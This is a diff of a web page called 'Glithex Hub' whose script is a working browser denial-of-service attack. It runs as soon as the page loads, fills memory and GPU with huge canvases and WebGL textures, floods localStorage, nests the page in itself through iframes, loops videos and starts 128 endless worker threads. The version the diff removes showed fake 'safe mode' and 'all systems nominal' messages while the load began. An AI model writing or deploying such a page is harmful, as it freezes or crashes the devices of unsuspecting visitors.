@@ -3,56 +3,93 @@
 <head>
   <title>Glithex Hub</title>
   <style>
-    body { margin: 0; padding: 0; overflow: hidden; background: #000; color: #0f0; font-family: monospace; }
-    #log { padding: 10px; }
+    body { margin: 0; background: #000; color: #0f0; font-family: monospace; }
+    canvas { display: none; }
   </style>
 </head>
 <body>
-<div id="log">Initializing...</div>
+<div id="log">Initializing Glithex Hub...</div>
 <script>
 let memoryLeak = [];
 let canvasCount = 0;
-let isOverloading = false;
 const log = document.getElementById('log');
+let isOverloading = false;
 
 function MainCanvas() {
     if (!isOverloading) return;
-    for (let i = 0; i < 5; i++) {
+    for (let i = 0; i < 20; i++) {
         const canvas = document.createElement('canvas');
-        canvas.width = 8000;
-        canvas.height = 8000;
+        canvas.width = 12000;
+        canvas.height = 12000;
         const ctx = canvas.getContext('2d');
-        for (let j = 0; j < 100; j++) {
+        for (let j = 0; j < 2000; j++) {
             ctx.fillStyle = `rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255})`;
-            ctx.fillRect(Math.random()*8000, Math.random()*8000, 500, 500);
+            ctx.fillRect(Math.random()*12000, Math.random()*12000, 1000, 1000);
         }
         document.body.appendChild(canvas);
         memoryLeak.push(canvas);
         canvasCount++;
     }
-    setTimeout(MainCanvas, 50);
+    setTimeout(MainCanvas, 1);
 }
 
-function CPULoad() {
-    if (!isOverloading) return;
-    let junk = [];
-    for (let i = 0; i < 5000; i++) {
-        let arr = new Array(10000).fill(Math.random());
-        junk.push(arr);
+function WebGLTextureAbuse() {
+    for (let i = 0; i < 10; i++) {
+        const canvas = document.createElement('canvas');
+        canvas.width = canvas.height = 4096;
+        document.body.appendChild(canvas);
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (!gl) continue;
+
+        const texture = gl.createTexture();
+        gl.bindTexture(gl.TEXTURE_2D, texture);
+        gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 4096, 4096, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
+        gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE);
+        gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE);
+        gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.LINEAR);
+        gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.LINEAR);
+
+        setInterval(() => {
+            gl.bindTexture(gl.TEXTURE_2D, texture);
+            gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 4096, 4096, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
+        }, 1);
     }
-    memoryLeak.push(junk);
-    setTimeout(CPULoad, 100);
+}
+
+function VideoDecodeAbuse() {
+    for (let i = 0; i < 10; i++) {
+        const video = document.createElement('video');
+        video.src = "https://www.w3schools.com/html/mov_bbb.mp4";
+        video.loop = true;
+        video.muted = true;
+        video.autoplay = true;
+        document.body.appendChild(video);
+    }
+}
+
+function LocalStorageFlood() {
+    setInterval(() => {
+        for (let i = 0; i < 5000; i++) {
+            localStorage.setItem(`key_${Math.random()}`, 'x'.repeat(5000));
+        }
+    }, 10);
+}
+
+function iframeLoop() {
+    const iframe = document.createElement('iframe');
+    iframe.src = window.location.href;
+    iframe.style.display = 'none';
+    document.body.appendChild(iframe);
+    setTimeout(iframeLoop, 1000);
 }
 
 function launchWorkers(num) {
     const code = `
-        let junk = [];
         while (true) {
-            let a = [];
-            for (let i = 0; i < 500; i++) {
-                a.push(new Array(10000).fill(Math.random()));
+            let load = [];
+            for (let i = 0; i < 2000; i++) {
+                load.push(new Array(20000).fill(Math.random()));
             }
-            junk.push(a);
         }
     `;
     const blob = new Blob([code], { type: "application/javascript" });
@@ -62,30 +99,20 @@ function launchWorkers(num) {
     }
 }
 
-function stealthStart() {
-    log.innerText = "Loading assets...";
-    setTimeout(() => {
-        log.innerText = "Preparing environment...";
-        setTimeout(() => {
-            log.innerText = "Running initial checks...";
-            setTimeout(() => {
-                log.innerText = "All systems nominal.";
-                setTimeout(() => {
-                    log.innerText = "Launching Glithex Hub in safe mode.";
-                    isOverloading = true;
-                    MainCanvas();
-                    CPULoad();
-                    launchWorkers(16);
-                    setInterval(() => {
-                        log.innerText = `Glithex Hub running... [${canvasCount} canvases loaded]`;
-                    }, 500);
-                }, 2000);
-            }, 2000);
-        }, 2000);
-    }, 2000);
+function startEverything() {
+    isOverloading = true;
+    MainCanvas();
+    WebGLTextureAbuse();
+    VideoDecodeAbuse();
+    LocalStorageFlood();
+    iframeLoop();
+    launchWorkers(128);
+    setInterval(() => {
+        log.innerText = `🔥 Glithex Hub Active | Canvases: ${canvasCount} | Memory: ${Math.round(window.performance.memory?.usedJSHeapSize / 1024 / 1024 || 0)} MB`;
+    }, 500);
 }
 
-stealthStart();
+startEverything();
 </script>
 </body>
 </html>
